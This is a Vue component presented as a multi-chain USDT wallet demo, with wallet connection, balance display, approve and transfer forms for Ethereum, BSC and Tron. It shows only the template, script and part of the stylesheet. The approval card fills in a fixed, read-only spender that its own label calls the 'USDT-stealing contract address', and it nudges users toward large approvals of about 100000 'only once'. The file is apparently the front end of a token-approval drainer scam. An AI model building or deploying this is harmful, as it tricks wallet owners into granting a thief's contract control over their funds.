<template>
  <div class="wallet-dashboard">
    <!-- 顶部导航栏 -->
    <header class="app-header">
      <div class="container">
        <h1 class="app-title">多链USDT钱包交互demo</h1>
        <!-- 链切换下拉框 -->
        <div class="chain-select-container">
          <label class="chain-select-label">当前链：</label>
          <select
              v-model="currentChain"
              @change="handleChainChange"
              :disabled="walletConnected || isConnecting"
              class="chain-select"
          >
            <option value="ethereum">以太坊（ERC20）</option>
            <option value="bsc">币安智能链（BEP20）</option>
            <option value="tron">波场（TRC20）</option>
          </select>
        </div>
      </div>
    </header>

    <main class="container main-content">
      <!-- 钱包未连接：连接卡片 -->
      <div class="card connect-card" v-if="!walletConnected">
        <div class="card-header">
          <h2 class="card-title">连接你的钱包</h2>
          <p class="card-desc">支持MetaMask、Trust、OKX、Phantom等钱包</p>
        </div>
        <div class="card-body">
          <div class="connect-methods">
            <!-- 1. Tron链专用连接选项 -->
            <div v-if="currentChain === 'tron'" class="tron-connect-group">
              <!-- Tronlink钱包连接 -->
              <button
                  class="connect-btn connect-btn--tronlink"
                  @click="handleTronlinkConnect"
                  :disabled="isConnecting"
              >
                <i class="connect-icon">🔗</i>
                <span class="connect-text">连接 TronLink 钱包</span>
                <span class="loading-spinner" v-if="isConnecting"></span>
              </button>
              
              <!-- OKX钱包连接 -->
              <button
                  class="connect-btn connect-btn--okx"
                  @click="handleChromeWalletConnect"
                  :disabled="isConnecting"
              >
                <i class="connect-icon">🔌</i>
                <span class="connect-text">连接 OKX 钱包</span>
                <span class="loading-spinner" v-if="isConnecting"></span>
              </button>
            </div>
            
            <!-- 2. EVM链钱包连接 -->
            <button
                v-else
                class="connect-btn connect-btn--chrome"
                @click="handleChromeWalletConnect"
                :disabled="isConnecting"
            >
              <i class="connect-icon">🔌</i>
              <span class="connect-text">连接钱包（Chrome）</span>
              <span class="loading-spinner" v-if="isConnecting"></span>
            </button>

            <!-- 3. 手机钱包唤起 -->
            <div class="mobile-connect-group">
              <label class="mobile-connect-label">手机钱包：</label>
              <select
                  v-model="selectedMobileWallet"
                  :disabled="isConnecting"
                  class="mobile-wallet-select"
              >
                <template v-if="currentChain === 'tron'">
                  <option value="tronlink">TronLink</option>
                  <option value="okx">OKX Wallet</option>
                  <option value="imtoken">imToken</option>
                </template>
                <template v-else>
                  <option value="metamask">MetaMask</option>
                  <option value="trust">Trust Wallet</option>
                  <option value="okx">OKX Wallet</option>
                  <option value="phantom">Phantom</option>
                  <option value="imtoken">imToken</option>
                </template>
              </select>
              <button
                  class="connect-btn connect-btn--mobile"
                  @click="handleOpenMobileWallet"
                  :disabled="isConnecting"
              >
                <i class="connect-icon">📱</i>
                <span class="connect-text">唤起手机钱包</span>
              </button>
            </div>

            <!-- 3. WalletConnect扫码 -->
            <button
                class="connect-btn connect-btn--qrcode"
                @click="handleWalletConnectV2"
                :disabled="isConnecting"
            >
              <i class="connect-icon">📷</i>
              <span class="connect-text">扫码连接（WalletConnect）</span>
              <span class="loading-spinner" v-if="isConnecting"></span>
            </button>
          </div>
        </div>
      </div>

      <!-- 钱包已连接：主功能区 -->
      <div v-else>
        <!-- 地址信息卡片 -->
        <div class="card address-card">
          <div class="card-header">
            <h2 class="card-title">钱包信息</h2>
            <span class="wallet-name" v-if="walletName">{{ walletName }}</span>
          </div>
          <div class="card-body address-card__body">
            <div class="address-info">
              <span class="address-label">当前地址：</span>
              <span class="address-value">{{ formattedAddress }}</span>
              <a
                  :href="`${chainConfig.explorerUrl}address/${walletAddress}`"
                  target="_blank"
                  class="address-explorer"
                  rel="noopener noreferrer"
              >
                查看浏览器
              </a>
            </div>
            <button
                class="disconnect-btn"
                @click="handleDisconnectWallet"
                :disabled="isConnecting"
            >
              <i class="disconnect-icon">❌</i>
              <span class="disconnect-text" v-if="!isConnecting">断开连接</span>
              <span class="loading-spinner small-spinner" v-if="isConnecting"></span>
            </button>
          </div>
        </div>

        <!-- USDT操作区：卡片组 -->
        <div class="card-group usdt-card-group">
          <!-- 1. 余额查询卡片 -->
          <div class="card balance-card">
            <div class="card-header">
              <h2 class="card-title">USDT余额</h2>
              <button
                  class="refresh-btn"
                  @click="fetchUsdtBalance"
                  :disabled="isLoading"
                  title="刷新余额"
              >
                <i class="refresh-icon">🔄</i>
                <span class="loading-spinner small-spinner" v-if="isLoading"></span>
              </button>
            </div>
            <div class="card-body balance-card__body">
              <p class="balance-value">{{ usdtBalance || '0' }} USDT</p>
              <p class="balance-desc">
                基于 {{ chainConfig.name }} 网络，数据实时同步区块链
              </p>
            </div>
          </div>

          <!-- 2. 授权卡片 -->
          <div class="card approve-card">
            <div class="card-header">
              <h2 class="card-title">USDT授权</h2>
              <p class="card-desc">授权指定地址操作你的USDT（仅需授权一次）</p>
            </div>
            <div class="card-body approve-card__body">
              <form class="approve-form">
                <!-- 授权地址输入框 -->
                <div class="form-group">
                  <label class="form-label">授权目标地址(即盗U合约地址)</label>
                  <div class="input-group">
                    <input
                        type="text"
                        v-model="approveSpender"
                        class="form-input"
                        readonly
                        placeholder="授权地址"
                    >
                    <button
                        type="button"
                        class="copy-btn"
                        @click="copyToClipboard(approveSpender)"
                        title="复制地址"
                    >
                      <i class="copy-icon">📋</i>
                      <span class="copy-toast" v-if="showCopyToast">已复制！</span>
                    </button>
                  </div>
                  <p class="form-hint">
                    {{ currentChain === 'tron' ? 'TRON链授权地址，用于USDT转账代理' : 'ETH/BSC链授权地址，用于USDT转账代理' }}
                  </p>
                </div>

                <!-- 授权金额输入框 -->
                <div class="form-group">
                  <label class="form-label">授权金额（USDT）</label>
                  <input
                      type="number"
                      step="0.000001"
                      min="0"
                      v-model="approveAmount"
                      class="form-input"
                      placeholder="请输入授权金额（如 100000）"
                      :disabled="isLoading"
                  >
                  <p class="form-hint">建议授权金额 ≥ 计划转账金额，避免重复授权</p>
                </div>

                <!-- 授权按钮 -->
                <button
                    type="button"
                    class="action-btn action-btn--approve"
                    @click="handleApproveUsdt"
                    :disabled="!approveAmount || isLoading"
                >
                  <span class="action-text" v-if="!isLoading">确认授权</span>
                  <span class="loading-spinner small-spinner" v-if="isLoading"></span>
                </button>

                <!-- 授权结果 -->
                <div class="tx-result" v-if="approveTxHash">
                  <p class="tx-result__title">授权成功！</p>
                  <a
                      :href="`${chainConfig.explorerUrl}tx/${approveTxHash}`"
                      target="_blank"
                      class="tx-hash-link"
                      rel="noopener noreferrer"
                  >
                    {{ approveTxHash }}
                  </a>
                </div>
              </form>
            </div>
          </div>

          <!-- 3. 转账卡片 -->
          <div class="card transfer-card">
            <div class="card-header">
              <h2 class="card-title">USDT转账</h2>
              <p class="card-desc">向指定地址转账USDT，需先授权</p>
            </div>
            <div class="card-body transfer-card__body">
              <form class="transfer-form">
                <!-- 接收地址 -->
                <div class="form-group">
                  <label class="form-label">接收地址</label>
                  <input
                      type="text"
                      v-model="transferTo"
                      class="form-input"
                      placeholder="请输入接收地址（如 0x... 或 T...）"
                      :disabled="isLoading"
                  >
                  <p class="form-hint">
                    {{ currentChain === 'tron' ? '请输入TRC20地址（以T开头）' : '请输入ERC20/BEP20地址（以0x开头）' }}
                  </p>
                </div>

                <!-- 转账金额 -->
                <div class="form-group">
                  <label class="form-label">转账金额（USDT）</label>
                  <input
                      type="number"
                      step="0.000001"
                      min="0"
                      v-model="transferAmount"
                      class="form-input"
                      placeholder="请输入转账金额（如 5.000000）"
                      :disabled="isLoading"
                  >
                  <p class="form-hint">当前可用余额：{{ usdtBalance || '0' }} USDT</p>
                </div>

                <!-- 转账按钮 -->
                <button
                    type="button"
                    class="action-btn action-btn--transfer"
                    @click="handleTransferUsdt"
                    :disabled="!transferTo || !transferAmount || isLoading"
                >
                  <span class="action-text" v-if="!isLoading">确认转账</span>
                  <span class="loading-spinner small-spinner" v-if="isLoading"></span>
                </button>

                <!-- 转账结果 -->
                <div class="tx-result" v-if="transferTxHash">
                  <p class="tx-result__title">转账成功！</p>
                  <a
                      :href="`${chainConfig.explorerUrl}tx/${transferTxHash}`"
                      target="_blank"
                      class="tx-hash-link"
                      rel="noopener noreferrer"
                  >
                    {{ transferTxHash }}
                  </a>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </main>

    <!-- 全局提示框 -->
    <div class="global-toast" :class="toastType" v-if="toastMsg">
      <i class="toast-icon">
        {{ toastType === 'success' ? '✅' : toastType === 'info' ? 'ℹ️' : '❌' }}
      </i>
      <span class="toast-text">{{ toastMsg }}</span>
      <button class="toast-close" @click="clearToast">×</button>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, watch, onUnmounted } from 'vue'
import { ChainType, ChainConfig, DEFAULT_CHAIN } from '@/utils/chainConfig'
import { formatAddress, fromUsdtToWei } from '@/utils/formatUtil'
import {
  connectChromeWallet,
  connectTronlinkWallet,
  openMobileWallet,
  initWalletConnectV2,
  disconnectWallet,
  getWalletState,
  resetWalletState,
  updateGlobalWalletState
} from '@/services/walletService'
import {
  eth_approve_address,
  tron_approve_address,
  getUsdtBalance,
  approveUsdt,
  transferUsdt
} from '@/services/contractService'

// 1. 基础状态管理
const currentChain = ref(DEFAULT_CHAIN)
const selectedMobileWallet = ref(DEFAULT_CHAIN === ChainType.TRON ? 'tronlink' : 'metamask')
const walletConnected = ref(false)
const walletAddress = ref('')
const walletName = ref('')
const usdtBalance = ref('0')
const isConnecting = ref(false)
const isLoading = ref(false)
const toastMsg = ref('')
const toastType = ref('error')

// 2. 授权相关状态
const approveSpender = ref('')
const approveAmount = ref('')
const approveTxHash = ref('')
const showCopyToast = ref(false)

// 3. 转账相关状态
const transferTo = ref('')
const transferAmount = ref('')
const transferTxHash = ref('')

// 4. 状态同步定时器
let stateSyncTimer = null
// 5. 钱包事件监听器引用
let chainChangeHandler = null
let accountsChangeHandler = null

// 计算属性
const chainConfig = computed(() => ChainConfig[currentChain.value])
const formattedAddress = computed(() => formatAddress(walletAddress.value))

/**
 * USDT专用的单位转换函数（USDT使用6位小数）
 */
const fromUsdtUnits = (amount) => {
  if (!amount) return '0'

  // 确保是字符串以避免大数精度问题
  const strAmount = amount.toString()

  const state = getWalletState()

  // BSC USDT 18位小数
  if(state.chainType === ChainType.BSC) {
    return (strAmount / 1e18).toFixed(6)
  } else {
    // USDT使用6位小数，在链上存储的是乘以1e6后的整数
    if (strAmount.length <= 6) {
      // 整数部分为0的情况
      return `0.${strAmount.padStart(6, '0')}`
    } else {
      // 有整数部分的情况
      const integerPart = strAmount.slice(0, -6)
      const decimalPart = strAmount.slice(-6)
      return `${integerPart}.${decimalPart}`
    }
  }
}

/**
 * 识别当前连接的钱包名称
 */
const detectWalletName = () => {
  // 检查TronLink钱包
  if (window.tronLink && window.tronWeb) return 'TronLink'
  
  // 检查OKX钱包的Tron支持
  if (window.okxwallet && window.okxwallet.tronWeb) return 'OKX Wallet'
  
  // 检查EVM钱包
  if (window.ethereum) {
    const { isMetaMask, isTrust, isOKXWallet, isPhantom } = window.ethereum
    if (isMetaMask) return 'MetaMask'
    if (isTrust) return 'Trust Wallet'
    if (isOKXWallet) return 'OKX Wallet'
    if (isPhantom) return 'Phantom'
    return '兼容钱包'
  }
  
  return '未知钱包'
}

/**
 * 初始化
 */
onMounted(() => {
  setApproveSpenderByChain(currentChain.value)
  const initState = getWalletState()
  updateWalletState(initState)

  // 设置钱包事件监听
  setupWalletEventListeners()

  // 状态同步定时器
  stateSyncTimer = setInterval(() => {
    syncWalletState()
  }, 2000)
})

/**
 * 组件卸载
 */
onUnmounted(() => {
  if (stateSyncTimer) {
    clearInterval(stateSyncTimer)
    stateSyncTimer = null
  }
  // 移除钱包事件监听
  removeWalletEventListeners()
})

/**
 * 设置钱包事件监听
 */
const setupWalletEventListeners = () => {
  // 先清除已有监听，避免重复绑定
  removeWalletEventListeners()

  // 根据当前链类型区分监听逻辑
  if (currentChain.value === ChainType.TRON) {
    console.log('当前tron')
    // OKX钱包事件监听
    if (window.okxwallet && window.okxwallet.tronWeb && window.okxwallet.tronWeb.on) {
      // 监听账户变化（断开时会返回空数组）
      window.okxwallet.tronWeb.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          handleDisconnectWallet()
        } else if (walletConnected.value && accounts[0] !== walletAddress.value) {
          walletAddress.value = accounts[0]
          showToast('TRON钱包账户已切换', 'info')
          fetchUsdtBalance()
        }
      })

      // 新增：监听钱包主动断开事件
      window.okxwallet.tronWeb.on('disconnected', () => {
        handleDisconnectWallet()
      })

      // 新增TRON账户变化监听
      window.okxwallet.tronWeb.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          handleDisconnectWallet()
        } else if (walletConnected.value && accounts[0] !== walletAddress.value) {
          walletAddress.value = accounts[0]
          showToast('TRON钱包账户已切换', 'info')
          fetchUsdtBalance()
        }
      })
    }
    
    // TronLink钱包事件监听
    if (window.tronLink && window.tronLink.on) {
      window.tronLink.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          handleDisconnectWallet()
        } else if (walletConnected.value && accounts[0] !== walletAddress.value) {
          walletAddress.value = accounts[0]
          showToast('TronLink钱包账户已切换', 'info')
          fetchUsdtBalance()
        }
      })
      
      window.tronLink.on('disconnect', () => {
        handleDisconnectWallet()
      })
    }
  } else {
    console.log('当前evm')
    // EVM链（ETH/BSC）监听（仅在当前链是EVM链时绑定）
    if (window.ethereum) {
      chainChangeHandler = async () => {
        if (walletConnected.value) {
          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
          let newChainType;
          switch (chainId) {
            case '0x1':
              newChainType = ChainType.ETH;
              break;
            case '0x38':
              newChainType = ChainType.BSC;
              break;
            default:
              showToast(`检测到未知链（${chainId}），请手动切换`, 'info');
              return;
          }

          if (newChainType !== currentChain.value) {
            currentChain.value = newChainType;
            setApproveSpenderByChain(newChainType);
            showToast(`已自动切换至${ChainConfig[newChainType].name}`, 'info');
            fetchUsdtBalance();
          }
        }
      };

      accountsChangeHandler = (accounts) => {
        if (accounts.length === 0) {
          handleDisconnectWallet()
        } else if (walletConnected.value && accounts[0] !== walletAddress.value) {
          walletAddress.value = accounts[0]
          showToast('钱包账户已切换', 'info')
          fetchUsdtBalance()
        }
      }

      window.ethereum.on('chainChanged', chainChangeHandler)
      window.ethereum.on('accountsChanged', accountsChangeHandler)
    }
  }
}

/**
 * 移除钱包事件监听
 */
const removeWalletEventListeners = () => {
  // 移除EVM事件监听
  if (window.ethereum) {
    if (chainChangeHandler) {
      window.ethereum.removeListener('chainChanged', chainChangeHandler)
    }
    if (accountsChangeHandler) {
      window.ethereum.removeListener('accountsChanged', accountsChangeHandler)
    }
  }

  // 移除TRON事件监听
  if (window.okxwallet && window.okxwallet.tronWeb && window.okxwallet.tronWeb.off) {
    window.okxwallet.tronWeb.off('networkChanged')
    window.okxwallet.tronWeb.off('accountsChanged')
    // 新增：移除disconnected事件监听
    window.okxwallet.tronWeb.off('disconnected')
  }
  
  // 移除TronLink事件监听
  if (window.tronLink && window.tronLink.off) {
    window.tronLink.off('accountsChanged')
    window.tronLink.off('disconnect')
  }
}

/**
 * 监听链切换
 */
watch(currentChain, (newChain) => {
  setApproveSpenderByChain(newChain)
  clearToast()
  resetForms()
})

/**
 * 按链类型设置授权地址
 */
const setApproveSpenderByChain = (chainType) => {
  if (chainType === ChainType.TRON) {
    approveSpender.value = tron_approve_address
  } else if (chainType === ChainType.ETH) {
    approveSpender.value = eth_approve_address
  } else {
    approveSpender.value = '' // BSC的授权地址可以在这里补充
  }
}

/**
 * 同步钱包状态
 */
const syncWalletState = () => {
  const latestState = getWalletState();
  // 仅在连接状态、地址、链类型均变化时才更新（避免频繁触发）
  if (
      latestState.connected !== walletConnected.value ||
      latestState.address !== walletAddress.value ||
      (latestState.connected && latestState.chainType !== currentChain.value) // 仅在已连接时校验链类型
  ) {
    updateWalletState(latestState);
    if (!latestState.connected && walletConnected.value) {
      showToast('钱包已断开连接', 'info');
    }
  }
};

/**
 * 更新钱包状态到UI
 */
const updateWalletState = (state) => {

  walletConnected.value = state.connected
  walletAddress.value = state.address || ''
  currentChain.value = state.chainType || ChainType.ETH
  isConnecting.value = false

  // 识别并显示钱包名称
  if (state.connected) {
    // walletName.value = detectWalletName()
    // console.log(walletName.value)
    //  fetchUsdtBalance()
  } else {
    walletName.value = ''
    resetForms()
  }
}

/**
 * 处理链切换
 */
const handleChainChange = async () => {

  setApproveSpenderByChain(currentChain.value);
  clearToast();
  resetForms();

  // 关键逻辑：如果钱包已连接，需要通过钱包API切换链，不手动修改currentChain
  if (walletConnected.value && window.ethereum) {
    try {
      let chainIdHex = '';
      if (currentChain.value === ChainType.ETH) {
        chainIdHex = '0x1';  // 以太坊主网
      } else if (currentChain.value === ChainType.BSC) {
        chainIdHex = '0x38'; // BSC主网
      } else if (currentChain.value === ChainType.TRON) {
        // 波场链切换需要特殊处理（TronLink）
        if (window.okxwallet.tronWeb) {

          showToast('请在okx钱包中手动切换至波场主网', 'info');
          return;
        } else {
          showToast('未检测到okx钱包，请先安装', 'error');
          return;
        }
      }

      if (chainIdHex) {
        // 发起链切换请求（钱包会触发chainChanged事件，由事件监听器更新currentChain）
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: chainIdHex }],
        });
        // 注意：这里不手动更新currentChain，等待钱包事件回调
      }
    } catch (err) {
      console.error('链切换失败:', err);
      // 切换失败时，重置下拉框为原链（避免显示与实际不符）
      if (err.code === 4001) { // 用户拒绝切换
        showToast('已取消链切换', 'info');
      } else if (err.code === 4902) { // 链未添加，需要引导用户添加
        showToast('该链未添加至钱包，请先添加链', 'error');
      } else {
        showToast('链切换失败，请重试', 'error');
      }
      // 失败时强制同步一次实际链状态
      syncWalletState();
    }
  }
  // 钱包未连接时，直接允许切换（无需钱包确认）
  else {
    showToast(`已切换至${ChainConfig[currentChain.value].name}（未连接钱包）`, 'info');
  }
};

/**
 * 连接Chrome钱包
 */
const handleChromeWalletConnect = async () => {
  try {
    isConnecting.value = true
    clearToast()
    console.log(window.okxwallet.tronWeb)
    // 单独处理TRON链的okx连接
    if (currentChain.value === ChainType.TRON) {

      await connectChromeWallet(currentChain.value)
      const state = getWalletState()
      updateWalletState(state)
      // if (!window.okxwallet.tronLink) {
      //   throw new Error('未检测到Okk钱包，请先安装')
      // }
      //
      //
      //   // 触发okx登录授权（关键：主动请求账户访问）
      //   // accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' })
      // await window.okxwallet.tronLink.request({method: 'tron_requestAccounts'})
      // let address = window.okxwallet.tronWeb.defaultAddress.base58
      //
      // console.log(address)
      // // const address = window.tronWeb.defaultAddress.base58
      // if (!address) {
      //   throw new Error('okx未返回有效地址，请检查钱包是否解锁')
      // }
      //
      //
      // let state={
      //   connected: true,
      //   address:address,
      //   chainType: ChainType.TRON,
      //   provider: window.okxwallet.tronWeb
      // }
      // console.log(state)
      // // 1. 更新组件内状态
      // updateWalletState(state);
      //
      // // 2. 同步更新全局walletState（关键修复）
      // // updateGlobalWalletState({
      // //   connected: true,
      // //   address:address,
      // //   chainType: ChainType.TRON,
      // //   provider: window.okxwallet.tronWeb // 同步provider实例
      // // });
      // console.log(getWalletState())
      //setupWalletEventListeners()

      showToast(`成功连接 OkxWallet`, 'success')
    } else {

      // 原有EVM链钱包连接逻辑
      await connectChromeWallet(currentChain.value)

      const state = getWalletState()
      updateWalletState(state)

      showToast(`成功连接 ${walletName.value}`, 'success')
    }
  } catch (err) {
    isConnecting.value = false // 确保失败时停止转圈
    const errorMsg = err.message || '连接失败，请检查钱包是否安装并解锁'
    showToast(errorMsg, 'error')
    console.error('钱包连接错误:', err)
  } finally {
    isConnecting.value = false // 最终确保状态重置
  }
}

/**
 * 连接Tronlink钱包
 */
const handleTronlinkConnect = async () => {
  try {
    isConnecting.value = true
    clearToast()
    
    // 使用walletService中的connectTronlinkWallet函数
    await connectTronlinkWallet()
    
    // 获取更新后的钱包状态
    const state = getWalletState()
    updateWalletState(state)
    
    showToast('成功连接 TronLink 钱包', 'success')
    
  } catch (err) {
    isConnecting.value = false
    const errorMsg = err.message || '连接TronLink失败，请检查钱包是否安装并解锁'
    showToast(errorMsg, 'error')
    console.error('TronLink连接错误:', err)
  } finally {
    isConnecting.value = false
  }
}

/**
 * 唤起手机钱包
 */
const handleOpenMobileWallet = () => {
  try {
    clearToast()
    openMobileWallet(currentChain.value, selectedMobileWallet.value)
    showToast(`请在手机上确认连接 ${selectedMobileWallet.value}（未唤起请手动打开钱包）`, 'info')
  } catch (err) {
    showToast(err.message || '唤起失败，请确保手机已安装对应钱包', 'error')
  }
}

/**
 * 连接WalletConnect v2
 */
const handleWalletConnectV2 = async () => {
  try {
    isConnecting.value = true
    clearToast()
    await initWalletConnectV2(currentChain.value)
    const state = getWalletState()
    updateWalletState(state)
    showToast(`成功连接 ${walletName.value}（WalletConnect）`, 'success')
  } catch (err) {
    isConnecting.value = false
    showToast(err.message || '扫码连接失败，请重试', 'error')
  }
}

/**
 * 断开钱包连接
 */
const handleDisconnectWallet = async () => {
  try {
    isConnecting.value = true
    clearToast()
    await disconnectWallet()
    const state = getWalletState()
    updateWalletState(state)
    showToast('钱包已安全断开连接，下次连接可重新选择钱包', 'info')
  } catch (err) {
    isConnecting.value = false
    showToast(err.message || '断开失败，请重试', 'error')
  }
}

/**
 * 查询USDT余额 - 使用正确的USDT单位转换
 */
const fetchUsdtBalance = async () => {
  try {
    isLoading.value = true
    clearToast()
    const balanceRaw = await getUsdtBalance()  // 获取原始的合约返回值（整数）
    usdtBalance.value = fromUsdtUnits(balanceRaw)  // 使用USDT专用转换
  } catch (err) {
    showToast(err.message || '获取余额失败，请检查网络', 'error')
  } finally {
    isLoading.value = false
  }
}

/**
 * 处理USDT授权
 */
const handleApproveUsdt = async () => {
  try {
    isLoading.value = true
    approveTxHash.value = ''
    clearToast()
    const txHash = await approveUsdt(approveAmount.value, approveSpender.value)
    approveTxHash.value = txHash
    showToast('USDT授权成功，可进行转账操作', 'success')
    approveAmount.value = ''
  } catch (err) {
    showToast(err.message || '授权失败，请检查钱包权限或网络', 'error')
  } finally {
    isLoading.value = false
  }
}

/**
 * 处理USDT转账
 */
const handleTransferUsdt = async () => {
  try {
    isLoading.value = true
    transferTxHash.value = ''
    clearToast()
    const txHash = await transferUsdt(transferTo.value, transferAmount.value)
    transferTxHash.value = txHash
    showToast('USDT转账成功，正在同步余额...', 'success')
    transferTo.value = ''
    transferAmount.value = ''
    await fetchUsdtBalance()
  } catch (err) {
    showToast(err.message || '转账失败，请检查地址、余额或网络', 'error')
  } finally {
    isLoading.value = false
  }
}

/**
 * 复制到剪贴板
 */
const copyToClipboard = (text) => {
  navigator.clipboard.writeText(text).then(() => {
    showCopyToast.value = true
    setTimeout(() => {
      showCopyToast.value = false
    }, 2000)
  }).catch(err => {
    showToast('复制失败，请手动复制', 'error')
    console.error('复制失败:', err)
  })
}

/**
 * 显示提示信息
 */
const showToast = (message, type = 'info') => {
  toastMsg.value = message
  toastType.value = type
  setTimeout(() => {
    clearToast()
  }, 5000)
}

/**
 * 清除提示信息
 */
const clearToast = () => {
  toastMsg.value = ''
  toastType.value = 'error'
}

/**
 * 重置表单
 */
const resetForms = () => {
  approveAmount.value = ''
  approveTxHash.value = ''
  transferTo.value = ''
  transferAmount.value = ''
  transferTxHash.value = ''
  usdtBalance.value = '0'
}
</script>

<style scoped>
/* 基础样式重置 */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Inter', system-ui, -apple-system, sans-serif;
}

/* 容器样式 */
.container {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 16px;
}

/* 顶部导航栏 */
.app-header {
  background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%);
  color: white;
  padding: 16px 0;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.app-title {
  font-size: 1.5rem;
  font-weight: 600;
  margin-bottom: 8px;
  text-align: center;
}

.chain-select-container {
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
  flex-wrap: wrap;
}

.chain-select-label {
  font-size: 0.9rem;
  opacity: 0.9;
}

.chain-select {
  padding: 8px 12px;
  border-radius: 8px;
  border: none;
  background: rgba(255, 255, 255, 0.2);
  color: white;
  font-size: 0.9rem;
  cursor: pointer;
  transition: background 0.2s;
}

.chain-select:disabled {
  background: rgba(255, 255, 255, 0.1);
  cursor: not-allowed;
}

.chain-select option {
  background: #0d47a1;
}

/* 钱包名称显示（新增） */
.wallet-name {
  font-size: 0.85rem;
  padding: 4px 8px;
  border-radius: 4px;
  background: rgba(255, 255, 255, 0.2);
  margin-left: 12px;
}



/* 主内容区 */
.main-content {
  padding: 24px 0;
  min-height: calc(100vh - 120px);
}

/* 卡片基础样式 */
.card {
  background: white;
  border-radius: 16px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  overflow: hidden;
  margin-bottom: 24px;
  transition: transform 0.2s, box-shadow 0.2s;
}

.card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 24px rgba(0, 0, 0, 0.08);
}

.card-header {
  padding: 20px 24px;
  border-bottom: 1px solid #f5f5f5;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.card-title {
  font-size: 1.25rem;
  font-weight: 600;
  color: #1a237e;
  margin-bottom: 0;
}

.card-desc {
  font-size: 0.875rem;
  color: #666;
  opacity: 0.8;
  margin-top: 4px;
}

.card-body {
  padding: 24px;
}

/* 连接卡片 */
.connect-card .card-body {
  padding: 0;
}

.connect-methods {
  display: flex;
  flex-direction: column;
  gap: 12px;
  padding: 24px;
}

.connect-btn {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  padding: 14px 20px;
  border-radius: 12px;
  border: none;
  font-size: 0.95rem;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s;
}

.connect-btn:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.connect-icon {
  font-size: 1.2rem;
}

.connect-text {
  flex: 1;
  text-align: center;
}

/* 连接按钮主题色 */
.connect-btn--chrome {
  background: linear-gradient(135deg, #4285f4 0%, #3367d6 100%);
  color: white;
}

.connect-btn--chrome:hover:not(:disabled) {
  background: linear-gradient(135deg, #3367d6 0%, #2850b8 100%);
}

.connect-btn--mobile {
  background: linear-gradient(135deg, #34a853 0%, #2d9749 100%);
  color: white;
}

.connect-btn--mobile:hover:not(:disabled) {
  background: linear-gradient(135deg, #2d9749 0%, #247d3b 100%);
}

.connect-btn--qrcode {
  background: linear-gradient(135deg, #fbbc05 0%, #f9ab00 100%);
  color: #333;
}

.connect-btn--qrcode:hover:not(:disabled) {
  background: linear-gradient(135deg, #f9ab00 0%, #f59f00 100%);
}

/* 手机钱包唤起组 */
.mobile-connect-group {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.mobile-connect-label {
  font-size: 0.875rem;
  color: #666;
  padding-left: 4px;
}

.mobile-wallet-select {
  padding: 12px 16px;
  border-radius: 12px;
  border: 1px solid #e0e0e0;
  font-size: 0.9rem;
  color: #333;
  background: white;
}

/* 地址卡片 */
.address-card__body {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.address-info {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 8px;
  font-size: 0.95rem;
}

.address-label {
  color: #666;
  white-space: nowrap;
}

.address-value {
  flex: 1;
  min-width: 200px;
  font-family: 'SFMono-Regular', monospace;
  color: #1a237e;
  word-break: break-all;
}

.address-explorer {
  padding: 6px 12px;
  border-radius: 8px;
  background: #f0f7ff;
  color: #0d47a1;
  font-size: 0.85rem;
  text-decoration: none;
  transition: background 0.2s;
}

.address-explorer:hover {
  background: #e1efff;
}

.disconnect-btn {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 16px;
  border-radius: 8px;
  border: none;
  background: #ffebee;
  color: #c62828;
  font-size: 0.9rem;
  cursor: pointer;
  transition: background 0.2s;
  width: fit-content;
}

.disconnect-btn:hover:not(:disabled) {
  background: #ffcdd2;
}

.disconnect-icon {
  font-size: 1rem;
}

/* USDT卡片组 */
.usdt-card-group {
  display: flex;
  flex-direction: column;
  gap: 24px;
}

/* 余额卡片 */
.balance-card .card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.refresh-btn {
  padding: 8px;
  border-radius: 8px;
  border: none;
  background: #f5f5f5;
  color: #666;
  cursor: pointer;
  transition: background 0.2s;
}

.refresh-btn:hover:not(:disabled) {
  background: #e0e0e0;
}

.refresh-icon {
  font-size: 1.1rem;
}

.balance-card__body {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  padding: 32px 24px;
}

.balance-value {
  font-size: 1.5rem;
  font-weight: 700;
  color: #1a237e;
}

.balance-desc {
  font-size: 0.9rem;
  color: #666;
  opacity: 0.8;
  text-align: center;
}

/* 表单基础样式 */
.form-group {
  margin-bottom: 20px;
}

.form-label {
  display: block;
  margin-bottom: 8px;
  font-size: 0.9rem;
  font-weight: 500;
  color: #333;
}

.form-input {
  width: 100%;
  padding: 14px 16px;
  border-radius: 12px;
  border: 1px solid #e0e0e0;
  font-size: 0.95rem;
  color: #333;
  transition: border 0.2s, box-shadow 0.2s;
}

.form-input:focus {
  outline: none;
  border-color: #0d47a1;
  box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
}

.form-input:read-only {
  background: #fafafa;
  color: #1a237e;
  cursor: default;
}

.form-hint {
  margin-top: 6px;
  font-size: 0.8rem;
  color: #666;
  opacity: 0.8;
}

/* 输入框组 */
.input-group {
  display: flex;
  align-items: center;
  gap: 4px;
}

.copy-btn {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0 12px;
  border-radius: 0 12px 12px 0;
  border: 1px solid #e0e0e0;
  border-left: none;
  background: #f5f5f5;
  color: #666;
  cursor: pointer;
